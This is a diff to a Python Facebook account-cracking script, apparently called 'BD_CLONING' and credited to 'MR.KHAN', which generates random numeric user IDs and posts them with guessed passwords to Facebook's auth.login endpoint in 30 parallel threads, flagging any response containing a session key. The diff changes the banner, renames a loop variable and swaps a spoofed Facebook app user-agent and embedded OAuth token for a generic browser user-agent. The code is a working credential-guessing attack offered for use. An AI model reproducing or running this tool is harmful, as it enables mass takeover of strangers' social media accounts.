@@ -28,14 +28,10 @@ cps=[]
 loop=0
 #-------------logo-----------------#
 logo=(f'''{B}
-$$\      $$\ $$$$$$$\        $$\   $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
-$$$\    $$$ |$$  __$$\       $$ | $$  |$$ |  $$ |$$  __$$\ $$$\  $$ |
-$$$$\  $$$$ |$$ |  $$ |      $$ |$$  / $$ |  $$ |$$ /  $$ |$$$$\ $$ |
-$$\$$\$$ $$ |$$$$$$$  |      $$$$$  /  $$$$$$$$ |$$$$$$$$ |$$ $$\$$ |
-$$ \$$$  $$ |$$  __$$<       $$  $$<   $$  __$$ |$$  __$$ |$$ \$$$$ |
-$$ |\$  /$$ |$$ |  $$ |      $$ |\$$\  $$ |  $$ |$$ |  $$ |$$ |\$$$ |
-$$ | \_/ $$ |$$ |  $$ |      $$ | \$$\ $$ |  $$ |$$ |  $$ |$$ | \$$ |
-\__|     \__|\__|  \__|      \__|  \__|\__|  \__|\__|  \__|\__|  \__|
+"\033[1;35m"  __  __ ___ 
+"\033[1;31m" |  \/  | _ \
+"\033[1;33m" | |\/| |   /
+"\033[1;32m" |_|  |_|_|_\
 {warna}--------------------------------------------{B}
  Owner    : {C}MR.KHAN{B}
  Guthub   : MR-KHAN-404
@@ -74,7 +70,7 @@ def BD_CLONING():
     except ValueError:
         limit=50000
     clear()
-    for uuid in range(limit):
+    for nuber in range(limit):
         nmp=''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     with tred(max_workers=30) as KHAN:
@@ -105,7 +101,7 @@ def method_crack(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            header={'User-Agent': '[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
